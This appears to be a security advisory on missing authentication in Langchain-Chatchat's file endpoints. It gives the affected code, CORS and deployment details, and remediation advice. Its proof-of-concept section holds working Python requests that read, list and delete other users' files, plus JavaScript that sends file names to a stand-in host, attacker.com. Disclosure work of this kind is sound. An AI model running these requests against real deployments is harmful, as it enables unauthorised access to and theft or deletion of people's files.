# Vuln-4: Missing Authentication on File Service Endpoints

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Vendor** | chatchat-space: https://github.com/chatchat-space/Langchain-Chatchat |
| **Product** | Langchain-Chatchat |
| **Affected Versions** | 0.3.x (at least 0.3.1.3) |
| **Vulnerability Type** | CWE-862: Missing Authorization |
| **Affected File** | `libs/chatchat-server/chatchat/server/api_server/openai_routes.py:260-327` |
| **Severity** | High |
| **CVSS 3.1** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L — 9.4 (Critical when port exposed) |

## Description

Langchain-Chatchat exposes the `/v1/files`, `/v1/files/{file_id}`, `/v1/files/{file_id}/content`, and `DELETE /v1/files/{file_id}` endpoints without any authentication or authorization checks. In deployments where the API port (default 7861) is network-accessible, any unauthenticated user can upload, list, read, or delete files belonging to any other user.

This is exacerbated by:
- The predictable file identifier scheme (Vuln-3), which allows targeted access without enumeration
- CORS configured with `allow_origins=["*"]` (all origins permitted)
- Default binding to `0.0.0.0` exposing the port on all interfaces

### Vulnerable Endpoints

```python
# openai_routes.py — ALL endpoints lack authentication

@openai_router.post("/files")           # Upload — no auth
async def files(request, file: UploadFile, purpose: str = "assistants"):
    ...

@openai_router.get("/files")            # List — no auth
def list_files(purpose: str):
    ...

@openai_router.get("/files/{file_id}")          # Metadata — no auth
def retrieve_file(file_id: str):
    ...

@openai_router.get("/files/{file_id}/content")  # Read content — no auth
def retrieve_file_content(file_id: str):
    return FileResponse(file_path)

@openai_router.delete("/files/{file_id}")        # Delete — no auth
def delete_file(file_id: str):
    ...
```

### CORS Configuration

```python
# server_app.py:29-36
if Settings.basic_settings.OPEN_CROSS_DOMAIN:
    app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],       # <- all origins
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )
```

## Standard Deployment Architecture

```
User Browser
    |
    | :8501 (Streamlit WebUI — user-facing)
    v
Streamlit Process (:8501)
    |
    | Internal calls to :7861
    v
FastAPI Process (:7861)  <- API port, intended as internal
```

In the standard deployment, port 7861 is intended for internal use by the Streamlit server. However:
- Docker `network_mode: host` exposes both ports directly
- Default binding to `0.0.0.0` makes 7861 accessible on LAN
- No firewall rules configured by default
- CORS allows cross-origin requests from any domain

## Proof of Concept

### Read Any User's File

```python
import base64, requests
from datetime import datetime

API = "http://<target>:7861"
today = datetime.now().strftime("%Y-%m-%d")

# Construct file_id for target file
file_id = base64.urlsafe_b64encode(
    f"assistants/{today}/photo.png".encode()
).decode()

# Read without any authentication
resp = requests.get(f"{API}/v1/files/{file_id}/content")
if resp.status_code == 200:
    with open("stolen.png", "wb") as f:
        f.write(resp.content)
    print(f"Stolen {len(resp.content)} bytes")
```

### List All Uploaded Files

```python
resp = requests.get(f"{API}/v1/files", params={"purpose": "assistants"})
for f in resp.json()["data"]:
    print(f"  {f['filename']} ({f['bytes']} bytes, id={f['id']})")
```

### Delete Another User's File

```python
requests.delete(f"{API}/v1/files/{file_id}")
```

### Cross-Origin Attack (from any webpage)

Because CORS allows all origins, an attacker can host a malicious webpage that accesses the victim's Chatchat API:

```html
<script>
// Runs in victim's browser if they can reach :7861
fetch('http://target:7861/v1/files?purpose=assistants')
  .then(r => r.json())
  .then(data => {
    data.data.forEach(f => {
      // Exfiltrate file list to attacker's server
      new Image().src = `https://attacker.com/log?file=${f.filename}`;
    });
  });
</script>
```

## Impact

- **Confidentiality**: HIGH — Any uploaded image (including potentially sensitive screenshots, documents, etc.) can be read by any network-adjacent attacker
- **Integrity**: HIGH — Files can be overwritten or deleted without authentication
- **Availability**: LOW — Files can be deleted, disrupting ongoing vision chat sessions

### Severity Note

When the API port (7861) is not exposed to untrusted networks (e.g., behind a firewall, only Streamlit accesses it), the effective severity is reduced. However, the default Docker deployment with `network_mode: host` exposes the port, and no documentation warns about this.

## Remediation

### Immediate

1. Add authentication middleware to the `/v1/files` endpoints
2. Validate file ownership — users should only access their own uploads
3. Restrict CORS to specific trusted origins instead of `*`

### Architectural

```python
from fastapi import Depends, HTTPException
from some_auth_module import get_current_user

@openai_router.get("/files/{file_id}/content")
def retrieve_file_content(file_id: str, user = Depends(get_current_user)):
    # Verify file belongs to requesting user
    file_info = _get_file_info(file_id)
    if file_info.get("owner") != user.id:
        raise HTTPException(status_code=403, detail="Access denied")
    return FileResponse(_get_file_path(file_id))
```

## Credits

- Vulnerability Discovery: [dem0]
- Vulnerability Analysis: [dem0]

## Disclaimer

This vulnerability report is provided for educational and authorized security research purposes only. The information contained herein should be used responsibly and in accordance with applicable laws and regulations.
